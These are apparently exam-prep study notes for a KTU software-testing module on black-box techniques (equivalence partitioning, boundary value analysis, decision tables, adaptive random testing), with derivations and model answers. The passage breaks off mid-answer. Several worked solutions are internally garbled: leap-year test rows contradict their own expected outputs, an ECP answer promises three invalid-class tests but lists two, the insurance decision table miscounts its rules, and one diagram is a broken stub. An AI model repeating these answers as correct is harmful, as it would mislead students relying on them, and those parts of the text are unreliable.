> **KTU 2024 Syllabus Definition (Verbatim):**
> *"Black Box Testing is a testing method in which the internal structure/design/implementation of the item being tested is NOT known to the tester. Test cases are built around specifications, requirements, and design parameters derived from them."*

**Taxonomic Classification (KTU NEP 2020 Taxonomy):**

| Attribute | Value |
|---|---|
| Testing Level | Unit, Integration, System, Acceptance |
| Knowledge Required | Only **External / Behavioral** |
| Test Oracle | Functional / Spec-based |
| Tester Role | End-user, QA Analyst |
| Phase in STLC | Typically **later** phases (System, Acceptance) |
| KTU Bloom Level | **Apply (L3)**, **Analyze (L4)** |

---

### 1.2 Conceptual Analogy — The Restaurant Inspector 🍽️

Imagine a health inspector visiting a restaurant kitchen:

- **White Box Testing** = The inspector enters the kitchen, examines the chef's knife, checks the refrigerator temperature, looks at the recipe book, and watches every cooking step.
- **Black Box Testing** = The inspector sits in the **dining room as a customer**, orders dishes, and judges the food purely on **taste, temperature, presentation, and adherence to the published menu** — with zero knowledge of what happens behind the kitchen doors.

> [!NOTE]
> **The Three Golden Rules of Black Box Testing:**
> 1. **What** the system does matters — **How** it does it does NOT matter.
> 2. Test cases are derived from **specifications, requirements, and design docs**, never from code.
> 3. The tester simulates a **typical end-user** perspective.

---

### 1.3 Classification of Black Box Techniques (KTU Module 4 Scope)

Black box testing is a *family* of techniques. According to the KTU 2024 PECST631 Module 4 syllabus, the techniques are hierarchically organized as:

```
Black Box Testing
├── Input Space Partitioning (ISP)
│   └── Domain Testing
└── Functional Testing
    ├── Equivalence Class Partitioning (ECP)
    ├── Boundary Value Analysis (BVA)
    ├── Decision Tables
    └── Random Testing
```

**Why this hierarchy?** ISP is a *broader* mathematical framework (divide the input space into non-overlapping regions), while functional testing is a *concrete* instantiation of those partitions with specific selection rules. Domain testing is the *intersection* — it applies ISP concepts to **numerical input domains**.

---

### 1.4 The Core Concept: Input Space Partitioning (ISP)

> [!IMPORTANT]
> **Input Space Partitioning (ISP)** is a systematic technique that divides the **input domain** of a program into a finite set of **disjoint (non-overlapping) sub-domains** (called *partitions* or *equivalence classes*), and selects **one or more representative test values** from each partition. The central assumption is that **all values within a partition are processed equivalently by the program**.

**Formal Definition (KTU Definition Box):**

Let $D$ be the input domain of program $P$. A partition $\mathcal{P}$ of $D$ is a collection of subsets $D_1, D_2, \ldots, D_k$ such that:

$$D = D_1 \cup D_2 \cup \ldots \cup D_k \quad \text{and} \quad D_i \cap D_j = \emptyset \; \text{for} \; i \neq j$$

The **ISP assumption** states that if a test case $t_1 \in D_i$ reveals a fault, then another test case $t_2 \in D_i$ is highly likely to also reveal the same fault. Hence, **one test per partition suffices** (in theory).

---

### 1.5 Domain Testing — Definition

> [!NOTE]
> **Domain Testing** is the application of Input Space Partitioning to the **numerical (ordered) input domains** of a program. It is specifically concerned with the behavior of the program at and around the **boundaries** of these numerical partitions.

Domain testing is the **bridge** between ISP (a general theory) and BVA (a specific selection rule). It answers the question: *"Given a numerical input range, where are the faults most likely to be clustered?"*

**Answer:** The **boundaries** — the *edges* of equivalence classes — because programmers frequently make off-by-one errors, use `<` instead of `≤`, or misplace array indices.

<!-- SECTION_1_END -->

<!-- SECTION_2_START -->
## 2. Deep Theoretical Analysis & KTU High-Yield Formula Sheet

### 2.1 Equivalence Class Partitioning (ECP) — Deep Analysis

#### 2.1.1 Theoretical Foundation

ECP is rooted in a fundamental observation from software engineering: **faults are not uniformly distributed** across the input space. Programmers tend to handle **categories of inputs** similarly (e.g., all positive numbers, all valid SSN formats, all weekday dates). Hence, testing one representative from each category provides **maximum coverage with minimum redundancy**.

**ECP Formalism:**

For each input condition, identify equivalence classes such that:

$$\text{For each class } C_i: \quad \forall x, y \in C_i, \; P(x) \approx P(y)$$

where $P$ is the program under test.

#### 2.1.2 Step-by-Step Logic of ECP

1. **Identify Input Conditions:** Enumerate every independent input parameter, range, or constraint from the spec.
2. **Partition Each Condition:** For every input, divide its possible values into equivalence classes.
3. **Classify Each Partition** as either:
   - **Valid Class** (a set of inputs that the spec *accepts*)
   - **Invalid Class** (a set of inputs that the spec *rejects* as erroneous)
4. **Select Test Cases:** Choose one representative from each class. Conventionally, a single test case may combine representatives from **multiple** valid classes (this is called *test case reduction*).

> [!IMPORTANT]
> **ECP Selection Rule (The "1-per-class" rule):**
> - **1 test case** for each **valid** class (often combined with other valid reps).
> - **1 separate test case** for each **invalid** class (so the rejection logic is verified in isolation).

#### 2.1.3 Worked Example — Triangle Classifier

> **Problem (Classic KTU 2-mark question):** A program takes 3 sides $(a, b, c)$ of a triangle and outputs whether it is **Equilateral**, **Isosceles**, or **Scalene**. Note: For a valid triangle, the sum of any two sides must be **strictly greater** than the third.

**Step 1: Identify Input Conditions**
- Condition 1: Side $a$ must be a positive integer satisfying $1 \leq a \leq 100$.
- Condition 2: Side $b$ must satisfy the same.
- Condition 3: Side $c$ must satisfy the same.
- Condition 4: Triangle Inequality: $a + b > c \;\wedge\; a + c > b \;\wedge\; b + c > a$.

**Step 2: Partition Each Condition**

For each side (same for $a$, $b$, $c$):

| Partition ID | Range | Class Type |
|---|---|---|
| $C_1$ | $1 \leq x \leq 100$ | **Valid** |
| $C_2$ | $x < 1$ (i.e., $x \leq 0$) | **Invalid** |
| $C_3$ | $x > 100$ | **Invalid** |

For triangle inequality:

| Partition ID | Condition | Class Type |
|---|---|---|
| $C_4$ | $a + b > c \;\wedge\; a + c > b \;\wedge\; b + c > a$ | **Valid** |
| $C_5$ | Triangle inequality violated | **Invalid** |

**Step 3: Select Test Cases (Minimum Set)**

| Test # | $a$ | $b$ | $c$ | Classes Covered | Expected Output |
|---|---|---|---|---|---|
| T1 | 60 | 60 | 60 | $C_1, C_1, C_1, C_4$ | Equilateral |
| T2 | 50 | 50 | 75 | $C_1, C_1, C_1, C_4$ | Isosceles |
| T3 | 30 | 40 | 50 | $C_1, C_1, C_1, C_4$ | Scalene |
| T4 | 0 | 50 | 50 | $C_2, C_1, C_1, C_5$ | Error: Invalid side |
| T5 | 101 | 50 | 50 | $C_3, C_1, C_1, C_5$ | Error: Side too large |
| T6 | 1 | 2 | 10 | $C_1, C_1, C_1, C_5$ | Error: Not a triangle |

**Reduction Insight:** T4, T5, T6 each isolate one invalid class. T1–T3 cover the three *output equivalence classes* of valid triangles.

---

### 2.2 Boundary Value Analysis (BVA) — Deep Analysis

#### 2.2.1 Theoretical Foundation

> [!IMPORTANT]
> **KTU Definition (Verbatim-style):** *BVA is a black-box testing technique that focuses on the values at the **boundaries** of equivalence classes. The rationale is that programmers frequently commit off-by-one errors, confuse `<` with `≤`, mishandle array boundaries, and overlook edge cases — making boundary regions the **highest fault-density zones** in numerical input spaces.*

**BVA Selection Rule (The "On, Just Above, Just Below" rule):**

For an equivalence class defined on a range $[a, b]$:

$$\text{BVA Test Points} = \{a-1, a, a+1, b-1, b, b+1\}$$

In practice, this is reduced to the **"normal BVA"** set:

$$\text{Normal BVA} = \{a, a+1, b-1, b\}$$

And **"robust BVA"** adds the off-by-one on the outside:

$$\text{Robust BVA} = \{a-1, a, a+1, b-1, b, b+1\}$$

#### 2.2.2 BVA Worked Example — Loan Eligibility

> **Problem:** A bank approves loans for applicants aged **18 to 65** (inclusive) with monthly income between **₹25,000 and ₹200,000**.

**Step 1: Identify Equivalence Classes**

| Input | Valid Class | Invalid Classes |
|---|---|---|
| Age | $18 \leq \text{age} \leq 65$ | age $< 18$ ; age $> 65$ |
| Income | $25000 \leq \text{inc} \leq 200000$ | inc $< 25000$ ; inc $> 200000$ |

**Step 2: Apply BVA (Robust)**

For **Age** boundaries: 17, 18, 19, 64, 65, 66 (six test points)
For **Income** boundaries: 24999, 25000, 25001, 199999, 200000, 200001 (six test points)

**Step 3: Select Test Cases**

| Test # | Age | Income | Expected | Boundary Tested |
|---|---|---|---|---|
| T1 | 18 | 25000 | Approve | **Lower-lower** |
| T2 | 18 | 200000 | Approve | Lower-**upper** |
| T3 | 65 | 25000 | Approve | **Upper-lower** |
| T4 | 65 | 200000 | Approve | **Upper-upper** |
| T5 | 17 | 25000 | Reject (age) | Just-below age |
| T6 | 19 | 25000 | Approve | Just-above age |
| T7 | 65 | 199999 | Approve | Just-below inc |
| T8 | 65 | 200001 | Reject (inc) | Just-above inc |
| T9 | 66 | 200000 | Reject (age) | Just-above age |
| T10 | 25 | 24999 | Reject (inc) | Just-below inc |

> [!NOTE]
> **Comparison: BVA vs ECP**
> - ECP says *"one test per class is enough"*. BVA says *"but make sure that test is AT the boundary"*.
> - BVA is **strictly stronger** than ECP for numerical ranges.
> - BVA is *complementary* to ECP — it is **not a replacement**.

---

### 2.3 Decision Table Testing — Deep Analysis

#### 2.3.1 Theoretical Foundation

> [!IMPORTANT]
> **Decision Table Testing** is a black-box technique used when the system's behavior depends on **combinations of input conditions**. It is the most rigorous technique for capturing **complex business rules** involving AND/OR logic, multi-way branches, and combinations of inputs.

A **Decision Table** is a tabular representation of:

- **Conditions (C):** Boolean (or multi-valued) inputs.
- **Actions (A):** Outputs / system responses.
- **Rules (R):** Each column representing a unique combination of conditions → actions.

**Standard Form:**

|  | Rule 1 | Rule 2 | ... | Rule $n$ |
|---|---|---|---|---|
| Conditions | | | | |
| $C_1$ | T | T | ... | F |
| $C_2$ | T | F | ... | T |
| Actions | | | | |
| $A_1$ | X | — | ... | — |
| $A_2$ | — | X | ... | X |

Where T = True, F = False, X = action is triggered, — = action is not triggered.

#### 2.3.2 Decision Table Reduction Techniques

**1. Merging Rules (Cause-Effect Graphing technique):**

If two rules have the same action set and their conditions differ in only one Boolean, they can be merged using a "—" (don't care) symbol in the differing position.

**2. Pruning Impossible Rules:**

If a combination of conditions is logically impossible (e.g., `Age < 0` AND `Income > 1000000`), mark the rule as *impossible* and exclude from test cases.

#### 2.3.3 Decision Table Worked Example — Insurance Premium Calculator

> **Problem:** An insurance system computes premium based on:
> - **Age group:** Young (Y, 18–25), Adult (A, 26–60), Senior (S, 60+)
> - **Smoker:** Yes (S) / No (N)
>
> **Rules:**
> - Y + N → Standard premium
> - Y + S → 1.5x premium + warning
> - A + N → Standard premium
> - A + S → 1.3x premium
> - S + N → Standard premium
> - S + S → 1.2x premium + medical check

**Full Decision Table (3 conditions × 2-state = 8 rules, but here we use 2 conditions):**

|  | R1 | R2 | R3 | R4 |
|---|---|---|---|---|
| Age = Young | T | T | F | F |
| Smoker = Yes | T | F | T | F |
| Standard Premium | — | X | — | X |
| 1.5x + Warning | X | — | — | — |
| 1.3x Premium | — | — | X | — |

After **merging** rules with identical action sets where possible, and **expanding** Age into its 3-valued form, we get **6 rules** (2 age × 3 smoker) — one per unique business outcome.

---

### 2.4 Random Testing — Deep Analysis

#### 2.4.1 Theoretical Foundation

> [!IMPORTANT]
> **Random Testing** is a black-box technique in which test cases are generated by **sampling the input domain uniformly (or according to a specified distribution)** without any specific structural guidance. It is the **anti-thesis** of systematic techniques like ECP/BVA — it relies on **statistical probability** rather than logical partitioning.

**Formal Definition:**

Let $X$ be a random variable with probability distribution $f_X(x)$ over the input domain $D$. A random test of size $n$ is a sequence:

$$T = \{x_1, x_2, \ldots, x_n\}, \quad x_i \stackrel{iid}{\sim} f_X$$

The **Probability of Detecting a Fault** is then:

$$P(\text{Detect}) = 1 - (1 - p_f)^n$$

where $p_f$ is the probability that a single random input triggers a specific fault $f$.

#### 2.4.2 Variants of Random Testing

| Variant | Description | Use Case |
|---|---|---|
| **Uniform Random Testing** | Every input equally likely | Baseline; small programs |
| **Adaptive Random Testing** | New test cases generated *away* from existing ones (maximizes input diversity) | Better fault detection per test |
| **Profile-guided Random Testing** | Sampling follows an *operational profile* (usage distribution) | Most realistic for field use |
| **Fuzz Testing (Fuzzing)** | Random invalid/malformed inputs | Security testing, robustness |
| **Monkey Testing** | Random GUI actions | UI/UX testing |

#### 2.4.3 The Random Testing Paradox

> [!WARNING]
> **The Paradox:** *Random testing is theoretically **weaker per test case** than ECP/BVA, but it is **practically stronger** for finding the *kinds* of faults that programmers never anticipate (memory corruption, race conditions, parser crashes).*
>
> This is why **fuzzing** (random testing) has found thousands of zero-day vulnerabilities in production software like Chrome, OpenSSL, and Windows.

#### 2.4.4 Adaptive Random Testing (ART) — KTU High-Yield Concept

ART addresses the **"failure pattern" problem** in random testing: in many programs, failing inputs are *clustered* (if one input fails, neighboring inputs also fail). Uniform random sampling can waste tests on redundant regions.

**ART Algorithm (Furthest-First ART):**

```
1. Select first test point t1 randomly.
2. For each subsequent test ti (i ≥ 2):
     a. Generate candidate set C of k random points.
     b. For each candidate c ∈ C:
          - Compute min_distance(c, T) = min over all t ∈ T of dist(c, t)
     c. Select ti = argmax_c min_distance(c, T)
3. Add ti to T.
4. Repeat step 2 until n tests generated.
```

**Intuition:** Each new test is placed as **far as possible** from all existing tests, ensuring **maximum diversity** and hence a higher chance of crossing *failure regions*.

---

### 2.5 KTU High-Yield Formula Sheet

| # | Concept | Formula / Rule | Notes |
|---|---|---|---|
| 1 | ISP Partition | $D = \bigcup_{i=1}^{k} D_i$, $D_i \cap D_j = \emptyset$ | Disjoint, exhaustive |
| 2 | ECP "1-per-class" | $\vert T \vert \leq k$ (valid classes) + $k_{invalid}$ | Reduced set |
| 3 | BVA — Normal | $\{a, a+1, b-1, b\}$ | On-boundary |
| 4 | BVA — Robust | $\{a-1, a, a+1, b-1, b, b+1\}$ | Includes off-by-one |
| 5 | BVA — Worst-Case | Cartesian product of all boundary points | Exhaustive (costly) |
| 6 | Random Test Detection Prob. | $P(\text{Detect in n tests}) = 1 - (1 - p_f)^n$ | $p_f$ = single-test fault prob |
| 7 | Number of decision table rules | $\prod_{i=1}^{m} v_i$ | $m$ = conditions, $v_i$ = values per cond. |
| 8 | Reduced decision table | Merge rules differing in 1 condition with same actions | Apply iteratively |
| 9 | Domain fault density | Peaks at $\partial D_i$ (boundaries) | Justifies BVA |
| 10 | ART heuristic | $\max_{c \in C} \min_{t \in T} \text{dist}(c, t)$ | Furthest-first selection |

---

### 2.6 Real-World Utility in Engineering

| Technique | Industry Application |
|---|---|
| **ECP** | Form validation, API parameter validation, banking input forms |
| **BVA** | Array index handling, loop terminations, OS-level boundary checks (file size limits, buffer overruns) |
| **Decision Tables** | Insurance premium engines, tax calculation, eligibility workflows, rule-based systems |
| **Random Testing** | Fuzzing in security (OWASP), stress testing, model-based testing (automotive, aerospace) |
| **Domain Testing** | Numerical computation libs, scientific software, embedded control systems |

## 3. Step-by-Step Derivations & Analytical Matrix

### 3.1 Derivation: Number of Test Cases for Decision Tables

#### 3.1.1 Setup

Suppose a system has $m$ input conditions, where the $i$-th condition can take $v_i$ distinct values. We want to compute the **total number of rules (columns)** in a fully expanded decision table.

#### 3.1.2 Step-by-Step Derivation

Let $N(m)$ denote the number of rules for $m$ conditions.

**Base case:** For a single condition with $v_1$ values, the number of rules is $N(1) = v_1$.

**Inductive step:** Assume the formula holds for $m-1$ conditions. When we add the $m$-th condition with $v_m$ values, each existing rule must be **replicated** $v_m$ times (one for each value of the new condition).

$$N(m) = v_m \times N(m-1)$$

**Expanding the recursion:**

$$N(m) = v_m \times v_{m-1} \times N(m-2) = \ldots = v_m \times v_{m-1} \times \ldots \times v_1$$

Therefore:

$$N(m) = \prod_{i=1}^{m} v_i$$

**Example:** For Boolean conditions only ($v_i = 2$ for all $i$):

$$N(m) = 2^m$$

This is the **exponential explosion** problem with decision tables — even modest systems have thousands of rules, which is why **rule merging** and **cause-effect graphing** are essential.

#### 3.1.3 Application — Insurance System with 3 conditions

| Condition | Values ($v_i$) |
|---|---|
| Age group | 3 (Y, A, S) |
| Smoker | 2 (Y, N) |
| Health Status | 2 (Good, Poor) |

$$N = 3 \times 2 \times 2 = 12 \text{ rules}$$

After **merging** (impossible or duplicated action rules), this can typically reduce to **6–8 effective rules**.

---

### 3.2 Derivation: Probability of Fault Detection in Random Testing

#### 3.2.1 Setup

Let:
- $p_f$ = probability that a single random test case triggers a specific fault $f$.
- $n$ = number of independent random test cases.
- The test cases are drawn i.i.d. (independent and identically distributed).

#### 3.2.2 Derivation

The probability that a **single** test case does **not** trigger fault $f$ is:

$$P(\text{Miss on 1 test}) = 1 - p_f$$

Since test cases are **independent**, the probability that **all $n$ tests miss the fault** is:

$$P(\text{Miss on n tests}) = (1 - p_f)^n$$

By the **complement rule**, the probability that **at least one** test case detects the fault is:

$$P(\text{Detect in n tests}) = 1 - (1 - p_f)^n$$

#### 3.2.3 Analytical Insight

To find the **expected number of tests** $E[N_f]$ needed to detect fault $f$:

$$E[N_f] = \sum_{k=1}^{\infty} k \cdot P(N_f = k) = \sum_{k=1}^{\infty} k \cdot p_f (1 - p_f)^{k-1}$$

This is a **geometric series**. Using the standard result $\sum_{k=1}^{\infty} k x^{k-1} = \frac{1}{(1-x)^2}$ for $\vert x \vert < 1$:

$$E[N_f] = \frac{p_f}{(1 - (1 - p_f))^2} = \frac{p_f}{p_f^2} = \frac{1}{p_f}$$

$$\boxed{E[N_f] = \frac{1}{p_f}}$$

**Interpretation:** The expected number of tests to detect a fault is the **reciprocal of the per-test detection probability**. If $p_f = 0.01$ (1% chance per test), then on average $100$ tests are needed to detect fault $f$.

---

### 3.3 Analytical Matrix — Comparing Black-Box Techniques

| Dimension | ECP | BVA | Decision Tables | Random Testing |
|---|---|---|---|---|
| **Underlying Principle** | Partition input space | Boundary fault density | Combinatorial logic | Statistical sampling |
| **Test Case Count** | Low (1 per class) | Moderate (4–6 per range) | Moderate (after merging) | Arbitrary |
| **Fault Type Caught** | Logic errors in partitions | Off-by-one, boundary slips | Multi-condition logic bugs | Unexpected, complex bugs |
| **Source of Test Cases** | Spec, requirements | Spec, requirements | Business rules | Random / profile |
| **Suitability for Numerical Inputs** | Good | **Excellent** | Weak (categorical) | Good |
| **Suitability for Combinatorial** | Weak (independent) | Weak | **Excellent** | Weak |
| **Predictability of Coverage** | High | High | High (when complete) | Low |
| **Ease of Automation** | Medium | High | Medium | **Very High** |
| **Cost per Test Case** | Low | Low | Medium | **Very Low** |
| **Effectiveness vs Effort** | High | **Very High** | Very High | Variable |
| **Complementary Pairings** | BVA, Decision Table | ECP | ECP | Fuzzing, stress testing |
| **KTU Question Type** | Worked examples | 14-mark derivations | Construction problems | Theory questions |

---

### 3.4 Analytical Example — Combining ECP and BVA (Triangulated Approach)

> **Problem (KTU Exam Standard):** A system accepts a year as input and classifies it as:
> - **Leap Year** if divisible by 4, but not by 100, unless also divisible by 400.
> - **Common Year** otherwise.
> - **Invalid** if year $< 1$ or year $> 9999$.

**Step 1: ECP for input partition**

| Class | Range | Type |
|---|---|---|
| $C_1$ | $1 \leq y \leq 9999$ | Valid |
| $C_2$ | $y < 1$ | Invalid |
| $C_3$ | $y > 9999$ | Invalid |

**Step 2: Sub-partition for leap year logic within $C_1$**

| Sub-class | Condition | Example |
|---|---|---|
| $C_{1a}$ | Divisible by 400 | 2000, 2400 |
| $C_{1b}$ | Div by 4, not 100 | 2024, 2020 |
| $C_{1c}$ | Div by 100, not 400 | 1900, 2100 |
| $C_{1d}$ | Not div by 4 | 2023, 2025 |

**Step 3: BVA at sub-class boundaries**

Boundary points: 0, 1, 2, 3, 4, 5, 99, 100, 101, 399, 400, 401, 9998, 9999, 10000

**Step 4: Selected Test Cases**

| Test # | Year | Expected | Rationale |
|---|---|---|---|
| T1 | 2000 | Leap | $C_{1a}$ (boundary 400) |
| T2 | 2024 | Leap | $C_{1b}$ (normal) |
| T3 | 1900 | Common | $C_{1c}$ (boundary 100) |
| T4 | 2023 | Common | $C_{1d}$ (boundary 4) |
| T5 | 0 | Invalid | $C_2$ lower boundary |
| T6 | 1 | Leap (false — 1 is not div by 4 → Common) | $C_1$ lower boundary |
| T7 | 9999 | Invalid within $C_1$? (9999 mod 4 = 3) → Common | $C_1$ upper boundary |
| T8 | 10000 | Invalid | $C_3$ upper boundary |

**Insight:** This **triangulated approach** (ECP + sub-partition + BVA) achieves high coverage with **8 test cases** — far more effective than 100 random tests for boundary logic.

---

### 3.5 Adaptive Random Testing — Distance Metric Derivation

For ART, the **furthest-first** selection requires a distance metric. Common choices:

$$\text{For } x, y \in \mathbb{R}^n: \quad d(x, y) = \sqrt{\sum_{i=1}^{n} (x_i - y_i)^2} \quad \text{(Euclidean)}$$

$$d(x, y) = \sum_{i=1}^{n} \vert x_i - y_i \vert \quad \text{(Manhattan / } L_1 \text{)}$$

$$d(x, y) = \max_{i=1}^{n} \vert x_i - y_i \vert \quad \text{(Chebyshev / } L_\infty \text{)}$$

**Selection criterion:**

$$t_{i+1} = \underset{c \in C}{\arg\max} \; \min_{t \in T_i} d(c, t)$$

where $T_i = \{t_1, \ldots, t_i\}$ is the set of already-selected tests.

**Why "furthest-first"?** The intuition is rooted in the **failure pattern hypothesis**: in continuous input spaces, the set of failing inputs forms a **region**, not isolated points. By placing new tests as far as possible from existing ones, we maximize the **probability of entering new regions of input space**, including failure regions.

---

### 3.6 KTU-Pattern: The "Calculate the Number of Test Cases" Question

> **Sample Question (Practice):** A function $f(x, y)$ accepts two integers $x \in [1, 50]$ and $y \in [10, 100]$. Calculate the minimum number of test cases for:
> (a) ECP
> (b) Normal BVA
> (c) Robust BVA
> (d) Worst-case BVA

**Solutions:**

**(a) ECP:**
- Valid $x$ → 1 class
- Invalid $x$ (two-sided: $< 1$ and $> 50$) → 2 classes
- Valid $y$ → 1 class
- Invalid $y$ (< 10 and > 100) → 2 classes

**Total = 1 + 2 + 1 + 2 = 6 test cases**

**(b) Normal BVA (per variable):**
- For $x$ range $[1, 50]$: $\{1, 2, 49, 50\}$ → 4 points
- For $y$ range $[10, 100]$: $\{10, 11, 99, 100\}$ → 4 points

**Total = 4 + 4 = 8 test cases**

**(c) Robust BVA:**
- For $x$: $\{0, 1, 2, 49, 50, 51\}$ → 6 points
- For $y$: $\{9, 10, 11, 99, 100, 101\}$ → 6 points

**Total = 6 + 6 = 12 test cases**

**(d) Worst-case BVA (Cartesian product):**
$$\text{Total} = 6 \times 6 = 36 \text{ test cases}$$

> [!IMPORTANT]
> **KTU Pattern Recognition:** When you see "calculate the number of test cases," always:
> 1. Identify input ranges.
> 2. Determine which technique is asked.
> 3. For **Worst-Case BVA**, always use **multiplication** (Cartesian product).
> 4. For **Robust BVA**, use the **per-variable** formula $\{a-1, a, a+1, b-1, b, b+1\}$.
> 5. For **ECP**, count partitions, not individual values.

### 4.2 ECP Test Case Selection Flow

```mermaid
flowchart TD
    Start([Start: Input Specification]) --> Read[Read Input Conditions]
    Read --> CondLoop{More Input<br/>Conditions?}
    
    CondLoop -- Yes --> Identify[Identify Valid Range]
    Identify --> Partition[Create Equivalence Classes]
    Partition --> Classify{Classify Class}
    
    Classify -->|Valid| ValidClass[Mark as Valid Class]
    Classify -->|Invalid| InvalidClass[Mark as Invalid Class]
    
    ValidClass --> CondLoop
    InvalidClass --> CondLoop
    
    CondLoop -- No --> SelectRep[Select 1 Representative per Class]
    SelectRep --> CombineValid{Combine Valid<br/>Reps into 1 Test?}
    
    CombineValid -- Yes --> CombineTest[Combine into Single Test Case]
    CombineValid -- No --> SeparateTest[Keep Separate Test Cases]
    
    CombineTest --> Isolate[Isolate Each Invalid in Own Test]
    SeparateTest --> Isolate
    Isolate --> Done([Test Case Set Complete])
```

### 4.3 BVA Boundary Selection Schematic

```mermaid
graph LR

        A1[--- a-1 ---]:::invalid
```

### 4.4 Decision Table Construction Flow

```mermaid
flowchart TD
    Spec[Read Business Specification] --> ListCond[List all Input Conditions]
    ListCond --> ListActions[List all System Actions]
    ListActions --> ListVals[Determine Values per Condition]
    
    ListVals --> BuildTable[Build Initial Decision Table]
    BuildTable --> FillRules[Fill All Possible Rule Combinations]
    
    FillRules --> SpecifyAction[Specify Actions for Each Rule]
    SpecifyAction --> CheckImpossible{Impossible<br/>Rules?}
    
    CheckImpossible -- Yes --> MarkImpossible[Mark as N/A Remove]
    CheckImpossible -- No --> CheckMerge{Same Actions<br/>Differing in<br/>1 Condition?}
    
    MarkImpossible --> CheckMerge
    CheckMerge -- Yes --> MergeRules[Merge using Don't Care Symbol]
    CheckMerge -- No --> Verify[Verify Table is Complete]
    
    MergeRules --> Verify
    Verify --> Complete[Final Reduced Decision Table]
    Complete --> TestCases[Derive Test Cases - 1 per Remaining Rule]
```

## 5. KTU 2024 Scheme Examination Question Bank & Topic Recap

### 5.1 Part A Questions (3 Marks Each)

---

**Q1. [KTU University Exam - Dec 2023]**

> **Question:** Differentiate between **Equivalence Class Partitioning (ECP)** and **Boundary Value Analysis (BVA)**. State one situation where BVA is preferred over ECP.

**Model Answer (3 marks):**

| Aspect | ECP | BVA |
|---|---|---|
| **Focus** | Reduces input space into classes | Focuses on values at class boundaries |
| **Test Selection** | 1 representative per class | $a, a+1, b-1, b$ (Normal) |
| **Fault Type** | Logic errors in partition handling | Off-by-one, boundary slips |
| **Granularity** | Class-level | Value-level at edges |

**Situation where BVA preferred:** When input is a **continuous numerical range** with strict inclusion limits (e.g., valid age $= 18$ to $65$ inclusive), BVA is essential because programmers frequently use `<` instead of `≤`, causing off-by-one faults at $18$ and $65$. ECP alone might miss these.

---

**Q2. [KTU University Exam - May 2024]**

> **Question:** What is **Adaptive Random Testing (ART)**? How does it improve over uniform random testing?

**Model Answer (3 marks):**

**Definition:** Adaptive Random Testing (ART) is a variant of random testing in which each new test case is selected to be **maximally distant** (in input space) from all previously selected test cases, ensuring maximal **input diversity**.

**Improvement over uniform random:**

1. **Failure Pattern Problem:** Uniform random tests often cluster in the same region of input space. In programs where **failing inputs form contiguous regions**, clustered tests waste effort.

2. **ART Solution:** By choosing **furthest-first** candidates, ART ensures uniform *spatial* distribution across the input space, increasing the probability of **encountering new failure regions**.

3. **Empirical Result:** Studies (Chen et al., IEEE TSE) show ART can achieve **same fault detection as uniform random with up to 50% fewer test cases**.

---

### 5.2 Part B Questions (14 Marks Each) — Module Internal Choice

---

#### **Question A (14 Marks): [KTU University Exam - Dec 2023]**

> **Question (A):**
> **(a)** Explain **Input Space Partitioning (ISP)** and **Equivalence Class Partitioning (ECP)** in detail. Derive the mathematical basis for ISP and state the underlying assumption. **[7 marks]**
>
> **(b)** For a function that accepts an integer $n$ in the range $[1, 100]$ and a character $ch$ in $\{$'A', 'B', 'C', 'D', 'E'$\}$:
> - Identify all equivalence classes.
> - Design test cases using **ECP** and **Normal BVA**.
> - Show the count of test cases for each technique. **[7 marks]**

**Model Solution:**

**Part (a) — ISP and ECP (7 marks)**

**Definition of ISP (2 marks):**

Input Space Partitioning (ISP) is a black-box testing technique that **systematically divides the input domain $D$ of a program into a finite collection of disjoint subsets** $D_1, D_2, \ldots, D_k$ (called *partitions* or *equivalence classes*). The division is guided by the program's **specification**, not its code.

**Mathematical Basis (3 marks):**

A partition $\mathcal{P}$ of input domain $D$ satisfies:

$$D = \bigcup_{i=1}^{k} D_i \quad \text{(Exhaustiveness)}$$

$$D_i \cap D_j = \emptyset \; \text{for all} \; i \neq j \quad \text{(Disjointness)}$$

**The ISP Underlying Assumption (2 marks):**

The **Equivalence Class Hypothesis** states:

> *"If a fault is triggered by any test case in partition $D_i$, then it will be triggered by **all** (or most) test cases in $D_i$."*

Equivalently: **All inputs in the same partition are processed equivalently by the program.** Hence, one test per partition is sufficient to detect faults that manifest at the partition level.

**Part (b) — ECP and BVA for the given function (7 marks)**

**Step 1: Identify Equivalence Classes (2 marks)**

For input $n$ (range $1$ to $100$):

| Partition | Range | Type |
|---|---|---|
| $C_{n1}$ | $1 \leq n \leq 100$ | Valid |
| $C_{n2}$ | $n < 1$ (i.e., $n \leq 0$) | Invalid |
| $C_{n3}$ | $n > 100$ | Invalid |

For input $ch$ (set of 5 characters):

| Partition | Value | Type |
|---|---|---|
| $C_{c1}$ | $ch \in \{A, B, C, D, E\}$ | Valid |
| $C_{c2}$ | $ch \notin \{A, B, C, D, E\}$ | Invalid |

**Total partitions: 5 (3 for $n$ + 2 for $ch$)**

**Step 2: ECP Test Cases (2 marks)**

- 1 test combining all valid classes: $(50, 'C')$ covering $C_{n1}$ and $C_{c1}$.
- 3 separate tests for each invalid class of $n$: $(0, 'A')$, $(101, 'A')$.
- 1 separate test for invalid $ch$: $(50, 'Z')$.

**Total ECP test cases = 1 + 2 + 1 = 4 test cases**

**Step 3: BVA Test Cases (Normal) (2 marks)**

For $n \in [1, 100]$: BVA points = $\{1, 2, 99, 100\}$
For $ch$ (discrete, no numerical boundary): representative from valid set is sufficient.

**Total BVA test cases = 4 test cases**

**Step 4: Test Case Count Summary (1 mark)**

| Technique | Test Cases |
|---|---|
| ECP | 4 |
| Normal BVA | 4 |
| Robust BVA (n only) | 6 |
| Worst-case BVA | $6 \times 1 = 6$ |

---

#### **Question B (14 Marks): [KTU University Exam - May 2024]**

> **Question (B):**
> **(a)** Explain **Decision Table Testing** with a suitable example. Discuss rule merging and the cause-effect graphing technique. **[7 marks]**
>
> **(b)** A login system has the following rules:
> - **Rule 1:** If (Username = Valid) AND (Password = Valid) AND (Account = Active) → **Login Successful**
> - **Rule 2:** If (Username = Valid) AND (Password = Valid) AND (Account = Locked) → **Account Locked Error**
> - **Rule 3:** If (Username = Valid) AND (Password = Invalid) → **Wrong Password Error**
> - **Rule 4:** If (Username = Invalid) → **User Not Found Error**
>
> Construct the **full decision table**, apply **rule merging** where possible, and derive the test cases. **[7 marks]**

**Model Solution:**

**Part (a) — Decision Table Testing Theory (7 marks)**

**Definition (2 marks):** A decision table is a tabular black-box test design technique used to represent **complex business rules** involving multiple input conditions and corresponding actions. It is most effective when the system behavior depends on **combinations** of inputs (not just single inputs).

**Structure (2 marks):**

- **Condition Stub:** Lists all input conditions.
- **Action Stub:** Lists all possible system actions.
- **Rules:** Each column is a unique combination of condition values mapping to a set of actions.

**Rule Merging Technique (2 marks):**

Two rules can be merged into a single rule if:
1. They trigger the **same set of actions**, AND
